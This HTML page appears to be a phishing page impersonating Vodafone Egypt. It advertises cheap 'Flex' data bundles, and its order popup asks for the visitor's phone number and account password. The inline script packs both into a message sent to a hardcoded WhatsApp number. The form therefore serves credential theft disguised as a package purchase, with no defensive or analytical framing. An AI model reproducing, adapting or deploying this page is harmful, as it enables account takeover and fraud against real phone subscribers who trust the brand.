<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>فودافون - Free Neet</title>
  <link rel="stylesheet" href="style.css" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --red-primary: #e60000;
      --red-dark: #b00000;
      --red-light: #ff3333;
      --glass-bg: rgba(255, 255, 255, 0.07);
      --glass-border: rgba(255, 255, 255, 0.15);
      --glass-hover: rgba(255, 255, 255, 0.13);
      --text-primary: #ffffff;
      --text-secondary: rgba(255,255,255,0.75);
      --text-muted: rgba(255,255,255,0.45);
      --radius-lg: 20px;
      --radius-md: 14px;
      --radius-sm: 10px;
      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    }

    body {
      font-family: 'Segoe UI', 'Arial', sans-serif;
      background: #1a0000;
      background-image:
        radial-gradient(ellipse at 15% 15%, rgba(230,0,0,0.35) 0%, transparent 55%),
        radial-gradient(ellipse at 85% 85%, rgba(176,0,0,0.25) 0%, transparent 55%),
        radial-gradient(ellipse at 50% 50%, rgba(100,0,0,0.15) 0%, transparent 65%);
      min-height: 100vh;
      color: var(--text-primary);
      direction: rtl;
    }

    /* ===== Wrapper ===== */
    .page-wrapper {
      max-width: 860px;
      margin: 0 auto;
      padding: 28px 16px 70px;
    }

    /* ===== Back Button ===== */
    .back-btn-wrap {
      display: flex;
      justify-content: center;
      margin-bottom: 30px;
    }

    .back-btn {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      background: var(--glass-bg);
      border: 1.5px solid var(--glass-border);
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
      color: var(--text-primary);
      text-decoration: none;
      font-size: 1.05rem;
      font-weight: 600;
      padding: 14px 38px;
      border-radius: 50px;
      transition: var(--transition);
      letter-spacing: 0.3px;
      box-shadow: 0 0 24px rgba(230,0,0,0.2);
    }

    .back-btn:hover {
      background: rgba(230,0,0,0.2);
      border-color: var(--red-light);
      transform: translateY(-2px);
      box-shadow: 0 0 30px rgba(230,0,0,0.4);
    }

    /* ===== Header ===== */
    .page-header {
      text-align: center;
      margin-bottom: 44px;
    }

    .vodafone-logo {
      width: 84px;
      height: 84px;
      border-radius: 50%;
      background: linear-gradient(135deg, var(--red-primary), var(--red-dark));
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 18px;
      font-size: 2.4rem;
      box-shadow: 0 0 50px rgba(230,0,0,0.5);
      border: 2px solid rgba(255,60,60,0.4);
    }

    .page-header h1 {
      font-size: clamp(2.2rem, 8vw, 3.2rem);
      font-weight: 800;
      background: linear-gradient(135deg, #ff6666, #ff0000, #ffaaaa);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      letter-spacing: 1px;
    }

    /* ===== Cards Grid ===== */
    .cards-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 20px;
    }

    /* ===== Package Card ===== */
    .pkg-card {
      background: var(--glass-bg);
      border: 1.5px solid var(--glass-border);
      backdrop-filter: blur(18px);
      -webkit-backdrop-filter: blur(18px);
      border-radius: var(--radius-lg);
      padding: 28px 18px 22px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 16px;
      transition: var(--transition);
      position: relative;
      overflow: hidden;
      text-align: center;
    }

    .pkg-card::before {
      content: '';
      position: absolute;
      top: 0; left: 0; right: 0;
      height: 3px;
      background: linear-gradient(90deg, var(--red-dark), var(--red-primary), var(--red-light));
      border-radius: var(--radius-lg) var(--radius-lg) 0 0;
      opacity: 0;
      transition: var(--transition);
    }

    .pkg-card::after {
      content: '';
      position: absolute;
      inset: 0;
      border-radius: var(--radius-lg);
      background: radial-gradient(circle at 50% 0%, rgba(230,0,0,0.08) 0%, transparent 70%);
      pointer-events: none;
    }

    .pkg-card:hover {
      transform: translateY(-6px);
      border-color: rgba(230,0,0,0.45);
      box-shadow: 0 16px 48px rgba(230,0,0,0.2);
    }

    .pkg-card:hover::before { opacity: 1; }

    .card-icon {
      font-size: 2rem;
      line-height: 1;
    }

    .card-name {
      font-size: 1.15rem;
      font-weight: 700;
      color: var(--text-primary);
      line-height: 1.3;
    }

    .card-price-wrap {
      background: rgba(230,0,0,0.15);
      border: 1px solid rgba(230,0,0,0.3);
      border-radius: 50px;
      padding: 6px 20px;
    }

    .card-price {
      font-size: 1.35rem;
      font-weight: 800;
      color: #ff9999;
    }

    .order-btn {
      width: 100%;
      margin-top: auto;
      padding: 12px;
      border-radius: var(--radius-sm);
      border: none;
      background: linear-gradient(135deg, var(--red-dark), var(--red-primary));
      color: #fff;
      font-size: 0.98rem;
      font-weight: 700;
      cursor: pointer;
      transition: var(--transition);
      font-family: inherit;
      letter-spacing: 0.3px;
      box-shadow: 0 4px 16px rgba(230,0,0,0.35);
    }

    .order-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 26px rgba(230,0,0,0.5);
      filter: brightness(1.15);
    }

    .order-btn:active {
      transform: translateY(0);
      filter: brightness(0.9);
    }

    /* ===== Popup Overlay ===== */
    .popup-overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.7);
      backdrop-filter: blur(6px);
      -webkit-backdrop-filter: blur(6px);
      z-index: 9999;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .popup-overlay.open {
      display: flex;
    }

    .popup-box {
      background: #1c0505;
      border: 1.5px solid rgba(230,0,0,0.3);
      border-radius: var(--radius-lg);
      padding: 34px 28px;
      width: 100%;
      max-width: 420px;
      position: relative;
      box-shadow: 0 24px 70px rgba(0,0,0,0.55), 0 0 50px rgba(230,0,0,0.12);
      animation: popIn 0.3s cubic-bezier(0.34,1.56,0.64,1);
    }

    @keyframes popIn {
      from { opacity: 0; transform: scale(0.82) translateY(24px); }
      to   { opacity: 1; transform: scale(1) translateY(0); }
    }

    .popup-close {
      position: absolute;
      top: 14px;
      left: 14px;
      background: none;
      border: none;
      color: var(--text-muted);
      font-size: 1.4rem;
      cursor: pointer;
      width: 32px;
      height: 32px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      transition: var(--transition);
    }

    .popup-close:hover {
      background: rgba(255,255,255,0.08);
      color: #fff;
    }

    .popup-header {
      text-align: center;
      margin-bottom: 24px;
    }

    .popup-header h2 {
      font-size: 1.3rem;
      font-weight: 700;
      color: #fff;
      margin-bottom: 6px;
    }

    .popup-pkg-label {
      font-size: 0.92rem;
      color: #ff8888;
      font-weight: 600;
    }

    .popup-field {
      margin-bottom: 18px;
    }

    .popup-field label {
      display: block;
      font-size: 0.88rem;
      color: var(--text-secondary);
      margin-bottom: 8px;
      font-weight: 500;
    }

    .popup-field input {
      width: 100%;
      background: rgba(255,255,255,0.06);
      border: 1.5px solid rgba(255,255,255,0.12);
      border-radius: var(--radius-sm);
      padding: 12px 14px;
      color: #fff;
      font-size: 1rem;
      font-family: inherit;
      direction: rtl;
      transition: var(--transition);
      outline: none;
    }

    .popup-field input:focus {
      border-color: var(--red-primary);
      background: rgba(230,0,0,0.08);
      box-shadow: 0 0 0 3px rgba(230,0,0,0.18);
    }

    .popup-field input::placeholder {
      color: var(--text-muted);
      font-size: 0.9rem;
    }

    .popup-actions {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-top: 6px;
    }

    .btn-send {
      padding: 14px;
      border-radius: var(--radius-sm);
      border: none;
      background: linear-gradient(135deg, #25d366, #128c7e);
      color: #fff;
      font-size: 1rem;
      font-weight: 700;
      cursor: pointer;
      transition: var(--transition);
      font-family: inherit;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      box-shadow: 0 4px 16px rgba(37,211,102,0.3);
    }

    .btn-send:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 26px rgba(37,211,102,0.45);
      filter: brightness(1.08);
    }

    .btn-cancel {
      padding: 12px;
      border-radius: var(--radius-sm);
      border: 1.5px solid rgba(255,255,255,0.14);
      background: transparent;
      color: var(--text-secondary);
      font-size: 0.95rem;
      font-weight: 600;
      cursor: pointer;
      transition: var(--transition);
      font-family: inherit;
    }

    .btn-cancel:hover {
      background: rgba(255,255,255,0.07);
      color: #fff;
      border-color: rgba(255,255,255,0.28);
    }

    /* ===== Responsive ===== */
    @media (max-width: 640px) {
      .cards-grid { grid-template-columns: 1fr; gap: 16px; }
      .page-wrapper { padding: 18px 14px 56px; }
      .popup-box { padding: 26px 18px; }
    }

    @media (min-width: 641px) and (max-width: 800px) {
      .cards-grid { grid-template-columns: repeat(3, 1fr); gap: 14px; }
      .pkg-card { padding: 22px 14px 18px; }
    }
  </style>
</head>
<body>

  <div class="page-wrapper">

    <!-- Back Button -->
    <div class="back-btn-wrap">
      <a href="index.html" class="back-btn">🏠 الرجوع للرئيسية</a>
    </div>

    <!-- Header -->
    <div class="page-header">
      <div class="vodafone-logo">📶</div>
      <h1>فودافون</h1>
    </div>

    <!-- Package Cards -->
    <div class="cards-grid">

      <!-- Package 1 -->
      <div class="pkg-card">
        <div class="card-icon">📦</div>
        <div class="card-name">2600 فليكس</div>
        <div class="card-price-wrap">
          <div class="card-price">50 جنيه</div>
        </div>
        <button class="order-btn" onclick="openPopup('2600 فليكس', '50 جنيه')">اطلب الآن</button>
      </div>

      <!-- Package 2 -->
      <div class="pkg-card">
        <div class="card-icon">📦</div>
        <div class="card-name">5200 فليكس</div>
        <div class="card-price-wrap">
          <div class="card-price">90 جنيه</div>
        </div>
        <button class="order-btn" onclick="openPopup('5200 فليكس', '90 جنيه')">اطلب الآن</button>
      </div>

      <!-- Package 3 -->
      <div class="pkg-card">
        <div class="card-icon">📦</div>
        <div class="card-name">10400 فليكس</div>
        <div class="card-price-wrap">
          <div class="card-price">180 جنيه</div>
        </div>
        <button class="order-btn" onclick="openPopup('10400 فليكس', '180 جنيه')">اطلب الآن</button>
      </div>

    </div>
  </div>

  <!-- ===== Order Popup ===== -->
  <div class="popup-overlay" id="orderPopup" onclick="handleOverlayClick(event)">
    <div class="popup-box">
      <button class="popup-close" onclick="closePopup()" title="إغلاق">✕</button>

      <div class="popup-header">
        <h2>طلب الباقة</h2>
        <div class="popup-pkg-label" id="popupLabel"></div>
      </div>

      <div class="popup-field">
        <label>📱 رقم الهاتف</label>
        <input type="tel" id="phoneInput" placeholder="أدخل رقم هاتفك" maxlength="15" />
      </div>

      <div class="popup-field">
        <label>🔑 الباسورد</label>
        <input type="password" id="passInput" placeholder="أدخل الباسورد" />
      </div>

      <div class="popup-actions">
        <button class="btn-send" onclick="sendWhatsApp()">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
            <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/>
          </svg>
          إرسال الطلب
        </button>
        <button class="btn-cancel" onclick="closePopup()">إلغاء</button>
      </div>
    </div>
  </div>

  <script src="script.js"></script>
  <script>
    const WA_NUMBER = '201001621853';

    let currentPkg   = '';
    let currentPrice = '';

    function openPopup(pkg, price) {
      currentPkg   = pkg;
      currentPrice = price;

      document.getElementById('popupLabel').textContent = pkg + ' — ' + price;
      document.getElementById('phoneInput').value = '';
      document.getElementById('passInput').value  = '';

      document.getElementById('orderPopup').classList.add('open');
      document.body.style.overflow = 'hidden';

      setTimeout(() => document.getElementById('phoneInput').focus(), 300);
    }

    function closePopup() {
      document.getElementById('orderPopup').classList.remove('open');
      document.body.style.overflow = '';
    }

    function handleOverlayClick(e) {
      if (e.target === document.getElementById('orderPopup')) closePopup();
    }

    function sendWhatsApp() {
      const phone = document.getElementById('phoneInput').value.trim();
      const pass  = document.getElementById('passInput').value.trim();

      if (!phone) {
        const inp = document.getElementById('phoneInput');
        inp.style.borderColor = '#ff3333';
        inp.focus();
        setTimeout(() => { inp.style.borderColor = ''; }, 1800);
        return;
      }

      let msg = 'طلب جديد\n\n';
      msg += 'الشبكة: فودافون\n\n';
      msg += 'الباقة: ' + currentPkg + '\n\n';
      msg += 'السعر: ' + currentPrice + '\n\n';
      msg += 'رقم الهاتف: ' + phone;
      if (pass) msg += '\n\nالباسورد: ' + pass;

      window.open('https://wa.me/' + WA_NUMBER + '?text=' + encodeURIComponent(msg), '_blank');
      closePopup();
    }

    document.addEventListener('keydown', function(e) {
      if (e.key === 'Escape') closePopup();
    });
  </script>
</body>
</html>
